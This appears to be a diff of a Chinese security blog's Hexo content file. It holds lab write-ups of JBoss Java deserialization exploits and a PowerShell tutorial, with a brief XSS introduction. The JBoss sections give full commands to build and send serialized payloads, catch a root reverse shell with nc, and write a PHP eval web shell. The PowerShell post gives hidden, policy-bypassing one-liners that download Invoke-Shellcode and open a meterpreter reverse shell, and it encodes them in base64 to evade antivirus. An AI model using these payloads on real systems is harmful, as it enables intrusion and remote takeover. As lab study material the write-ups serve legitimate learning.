+<p>编译并生成序列化数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br><span class="line">Saving serialized object in ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
+<p>我们执行的命令是<code>touch /tmp/success</code>，执行完成后，将生成一个文件<code>ExampleCommonsCollections1WithHashMap.ser</code>，将该文件作为body发送如下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
+<p>这个过程会产生一些警告，但好像不影响使用</p>
+<p>执行 <code>docker exec -ti 容器ID /bin/bash</code> 进入容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;opt&#x2F;jdk# cd &#x2F;tmp</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">hsperfdata_root  success</span><br></pre></td></tr></table></figure>
+<p>可以利用重定向写入一句话木马:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php @eval(_POST[&#39;test&#39;]); ?&gt; &gt; &#x2F;tmp&#x2F;test.php</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">aa.php	hsperfdata_root  success</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# cat aa.php </span><br><span class="line">&lt;?php @eval(_POST[test]); ?&gt;</span><br><span class="line">root@0ec136da132e:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
+</ol>
+<h2 id="0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149"><a href="#0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149" class="headerlink" title="0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)"></a>0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)</h2><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker up -d</span><br></pre></td></tr></table></figure>
+<p>初始化完成后访问<code>http://192.168.220.151:8080/</code>即可看到JBoss默认页面<br>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化</p>
+<p>下载poc： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
+<p>使用poc：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
+<p>在攻击机上开启端口监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
+<p>向目标发送payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;JBoss Web&#x2F;3.0.0-CR2 - Error report&lt;&#x2F;title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;&#x2F;style&gt; &lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;&#x2F;h1&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;&#x2F;b&gt; Exception report&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;message&lt;&#x2F;b&gt; &lt;u&gt;&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;description&lt;&#x2F;b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;exception&lt;&#x2F;b&gt; &lt;pre&gt;java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation</span><br><span class="line">	org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)</span><br><span class="line">&lt;&#x2F;pre&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;note&lt;&#x2F;b&gt; &lt;u&gt;The full stack trace of the root cause is available in the JBoss Web&#x2F;3.0.0-CR2 logs.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;h3&gt;JBoss Web&#x2F;3.0.0-CR2&lt;&#x2F;h3&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC#</span><br></pre></td></tr></table></figure>
+<p>反弹shell成功！！！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 53530</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
+<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
+</ul>
+<h2 id="0x03-JMXInvokerServlet-反序列化漏洞"><a href="#0x03-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="0x03 JMXInvokerServlet 反序列化漏洞"></a>0x03 JMXInvokerServlet 反序列化漏洞</h2><h3 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>这个漏洞与前两个差别不大，JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象。</p>
+<p>所以，只要把url改成下面即可：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
+<p>在攻击机上开启端口监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
+<p>向目标发送payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell </span><br><span class="line">Warning: curl to output it to your terminal anyway, or consider &quot;--output </span><br><span class="line">Warning: &lt;FILE&gt;&quot; to save to a file.</span><br></pre></td></tr></table></figure>
+<p>有几个警告，不影响操作。</p>
+<p>反弹shell成功。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 41174</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1284,18 +1287,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XSS学习</title>
-    <url>/posts/21783.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="## 0x00 前言"></a>## 0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
-<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
-<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="## 0x01 反射型XSS"></a>## 0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
-<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
-<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="## 0x02 存储型XSS"></a>## 0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="## 0x03 DOM型XSS"></a>## 0x03 DOM型XSS</h2>]]></content>
-      <tags>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Weblogic复现之任意文件上传</title>
     <url>/posts/30478.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复现weblogic，今天复现一下其中的任意文件上传漏洞。</p>
@@ -1353,6 +1344,18 @@
       </categories>
       <tags>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS学习</title>
+    <url>/posts/21783.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="## 0x00 前言"></a>## 0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
+<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
+<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="## 0x01 反射型XSS"></a>## 0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
+<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
+<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="## 0x02 存储型XSS"></a>## 0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="## 0x03 DOM型XSS"></a>## 0x03 DOM型XSS</h2>]]></content>
+      <tags>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -1508,6 +1511,9 @@
       <categories>
         <category>hexo</category>
       </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
   </entry>
   <entry>
     <title>php伪协议</title>
@@ -1651,6 +1657,130 @@
       </categories>
       <tags>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>powershell学习</title>
+    <url>/posts/57592.html</url>
+    <content><![CDATA[<h2 id="powershell基础"><a href="#powershell基础" class="headerlink" title="powershell基础"></a>powershell基础</h2><p>Windows Powershell是一种命令行外壳程序和脚本环境，内置在每个受支持的Windows版本中，为Windows命令行使用者和脚本编写者利用 .NET Framework 的强大功能提供了便利。只要可以在一台计算机上面执行代码，就可以将Powershell脚本(.ps1)下载到磁盘中执行（甚至无需将脚本文件写入到磁盘中）。</p>
+<p>特点：</p>
+<ul>
+<li>在win7以上版本默认安装</li>
+<li>脚本可以在内存中运行，不需要写入磁盘</li>
+<li>几乎不会触发杀毒软件</li>
+<li>可以远程执行</li>
+<li>很多工具是基于powershell开发</li>
+<li>cmd的运行通畅会被阻，powershell通常不会</li>
+<li>使Windows脚本执行变得更容易</li>
+<li>可用于管理活动目录</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">操作系统</th>
+<th align="center">Powershell版本</th>
+<th align="center">是否可升级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">win7、win server 2008</td>
+<td align="center">2.0</td>
+<td align="center">可升级为3.0/4.0</td>
+</tr>
+<tr>
+<td align="center">win8、win server 2012</td>
+<td align="center">3.0</td>
+<td align="center">可升级为4.0</td>
+</tr>
+<tr>
+<td align="center">win8.1、win server 2012 R2</td>
+<td align="center">4.0</td>
+<td align="center">否</td>
+</tr>
+</tbody></table>
+<p>可以输入 <code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 命令查看Powershell的版本</p>
+<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319172210196.png" alt="image-20200319172210196"></p>
+<h2 id="powershell基本概念"><a href="#powershell基本概念" class="headerlink" title="powershell基本概念"></a>powershell基本概念</h2><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h3><p>一个powershell脚本其实就是一个简单的文本文件，其扩展名为<code>.ps1</code>。</p>
+<p>powershell脚本文件中包含一系列powershell命令，每个命令显示为单独的一行。</p>
+<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，powershell提供了一个执行策略，默认不能执行。</p>
+<p>如果powershell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-exccutionPolicy</span></span><br><span class="line"><span class="number">1</span>. Restricted  <span class="comment"># 脚本不能运行（默认设置）</span></span><br><span class="line"><span class="number">2</span>. RemoteSigned <span class="comment"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span></span><br><span class="line"><span class="number">3</span>. AllSigned  <span class="comment"># 仅当脚本由受信任的发布者签名时才能运行</span></span><br><span class="line"><span class="number">4</span>. Unrestricted <span class="comment"># 允许所有脚本运行</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用下面的cmdlet命令设置powershell的执行策略</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>要想运行一个powershell脚本，必须输入完整的路径和文件名。</p>
+<p>若在同一目录下，<code>./test.ps1</code>即可</p>
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接</p>
+<p>例：执行下面命令，让所有正在运行的，名字以字符 p 开头的程序停止运行</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="powershell常用命令"><a href="#powershell常用命令" class="headerlink" title="powershell常用命令"></a>powershell常用命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在powershell下，类似cmd命令的命令叫作cmdlet命令。二者命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为<code>Add</code>，<code>Get</code>，<code>Remove</code>，<code>Set</code>，<code>New</code>等。</p>
+<p>powershell命令不区分大小写。</p>
+<p>以文件操作为例：</p>
+<ul>
+<li>新建目录：<code>New-Item whitecellclub-ItemType Directory</code></li>
+<li>新建文件：<code>New-Item light.txt-ItemType File</code></li>
+<li>删除目录：<code>Remove-Item whitecellclub</code></li>
+<li>显示文本内容：<code>Get-Content test.txt</code></li>
+<li>设置文本内容：<code>Set-Content test.txt-Value &quot;hello,world!&quot;</code></li>
+<li>追加内容：<code>Add-Content light.txt-Value &quot;hahaha&quot;</code></li>
+<li>清除内容：<code>Clear-Content test.txt</code></li>
+</ul>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在Windows终端下输入 <code>powershell</code>，进入powershell命令行环境。输入 <code>help</code> 显示帮助菜单</p>
+<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319175708381.png" alt="image-20200319175708381"></p>
+<p>要想运行powershell脚本程序，必须使用管理员权限将策略从<code>Restricted</code>改成<code>Unrestricted</code></p>
+<ol>
+<li><p>绕过本地权限并执行</p>
+<p>将PowerUp.ps1上传到目标服务器。在命令行下执行如下命令，绕过安全策略，在目标服务器执行该脚本</p>
+</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320092852102.png" alt="image-20200320092852102"></p>
+<p>将同一个脚本上传到目标服务器中，在目标本地执行脚本文件</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>从网站服务器中下载脚本，绕过本地权限并隐藏执行</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[<span class="type">Parameters</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); <span class="built_in">Invoke-Shellcode</span> <span class="literal">-Payload</span> windows/meterpreter/reverse_https <span class="literal">-Lhost</span> <span class="number">192.168</span>.<span class="number">150.141</span> <span class="literal">-Lport</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-ExecutionPolicy Bypass (-Exec Bypass)：绕过执行安全策略。这个参数非常重要。在默认情况下，powershell的安全策略规定powershell不能运行命令和文件。</li>
+<li>-WindowStyle Hidden (-W Hidden)：隐藏窗口</li>
+<li>-NonInteractive (-NonI)：非交互模式。powershell不为用户提供交互式的提示</li>
+<li>-NoProfile (-NoP)：powershell控制台不加载当前用户的配置文件</li>
+<li>-noexit：执行后不退出shell。这个参数在使用键盘记录等脚本时非常重要</li>
+<li>-NoLogo：启动不显示版权标志的powershell</li>
+</ul>
+<ol start="3">
+<li><p>使用base64对powershell命令进行编码</p>
+<p>使用Base64对powershell命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。</p>
+<p>可以使用python脚本对所有的powershell命令进行base64编码。<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py" target="_blank" rel="noopener">python脚本</a></p>
+<p>在使用ps_encoder.py进行文本转换时，转换的对象必须是文本文件，因此先把命令保存为文本文件。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">echo <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> &gt;raw.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320110707604.png" alt="image-20200320110707604"></p>
+<p>在远程主机上执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="运行32位和64位powershell"><a href="#运行32位和64位powershell" class="headerlink" title="运行32位和64位powershell"></a>运行32位和64位powershell</h3><p>一些powershell脚本只能在指定平台上运行。在64位的Windows操作系统中，存在两个版本的powershell，一个是x64，另一个是x86。这两个版本的执行策略不会相互影响，可以把它们看成两个独立的程序。x64版本的powershell的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0\</code>目录下。</p>
+<p>运行32位Powershell脚本</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass</span><br></pre></td></tr></table></figure>
+
+<p>运行64位Powershell脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>
+
+<h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>
+]]></content>
+      <tags>
+        <tag>Powershell</tag>
       </tags>
   </entry>
   <entry>
@@ -1805,130 +1935,6 @@ tablename -C &quot;password&quot; --dump</code></p>
       </categories>
       <tags>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>powershell学习</title>
-    <url>/posts/57592.html</url>
-    <content><![CDATA[<h2 id="powershell基础"><a href="#powershell基础" class="headerlink" title="powershell基础"></a>powershell基础</h2><p>Windows Powershell是一种命令行外壳程序和脚本环境，内置在每个受支持的Windows版本中，为Windows命令行使用者和脚本编写者利用 .NET Framework 的强大功能提供了便利。只要可以在一台计算机上面执行代码，就可以将Powershell脚本(.ps1)下载到磁盘中执行（甚至无需将脚本文件写入到磁盘中）。</p>
-<p>特点：</p>
-<ul>
-<li>在win7以上版本默认安装</li>
-<li>脚本可以在内存中运行，不需要写入磁盘</li>
-<li>几乎不会触发杀毒软件</li>
-<li>可以远程执行</li>
-<li>很多工具是基于powershell开发</li>
-<li>cmd的运行通畅会被阻，powershell通常不会</li>
-<li>使Windows脚本执行变得更容易</li>
-<li>可用于管理活动目录</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">操作系统</th>
-<th align="center">Powershell版本</th>
-<th align="center">是否可升级</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">win7、win server 2008</td>
-<td align="center">2.0</td>
-<td align="center">可升级为3.0/4.0</td>
-</tr>
-<tr>
-<td align="center">win8、win server 2012</td>
-<td align="center">3.0</td>
-<td align="center">可升级为4.0</td>
-</tr>
-<tr>
-<td align="center">win8.1、win server 2012 R2</td>
-<td align="center">4.0</td>
-<td align="center">否</td>
-</tr>
-</tbody></table>
-<p>可以输入 <code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 命令查看Powershell的版本</p>
-<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319172210196.png" alt="image-20200319172210196"></p>
-<h2 id="powershell基本概念"><a href="#powershell基本概念" class="headerlink" title="powershell基本概念"></a>powershell基本概念</h2><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h3><p>一个powershell脚本其实就是一个简单的文本文件，其扩展名为<code>.ps1</code>。</p>
-<p>powershell脚本文件中包含一系列powershell命令，每个命令显示为单独的一行。</p>
-<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，powershell提供了一个执行策略，默认不能执行。</p>
-<p>如果powershell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-exccutionPolicy</span></span><br><span class="line"><span class="number">1</span>. Restricted  <span class="comment"># 脚本不能运行（默认设置）</span></span><br><span class="line"><span class="number">2</span>. RemoteSigned <span class="comment"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span></span><br><span class="line"><span class="number">3</span>. AllSigned  <span class="comment"># 仅当脚本由受信任的发布者签名时才能运行</span></span><br><span class="line"><span class="number">4</span>. Unrestricted <span class="comment"># 允许所有脚本运行</span></span><br></pre></td></tr></table></figure>
-
-<p>可以使用下面的cmdlet命令设置powershell的执行策略</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>要想运行一个powershell脚本，必须输入完整的路径和文件名。</p>
-<p>若在同一目录下，<code>./test.ps1</code>即可</p>
-<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接</p>
-<p>例：执行下面命令，让所有正在运行的，名字以字符 p 开头的程序停止运行</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="powershell常用命令"><a href="#powershell常用命令" class="headerlink" title="powershell常用命令"></a>powershell常用命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在powershell下，类似cmd命令的命令叫作cmdlet命令。二者命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为<code>Add</code>，<code>Get</code>，<code>Remove</code>，<code>Set</code>，<code>New</code>等。</p>
-<p>powershell命令不区分大小写。</p>
-<p>以文件操作为例：</p>
-<ul>
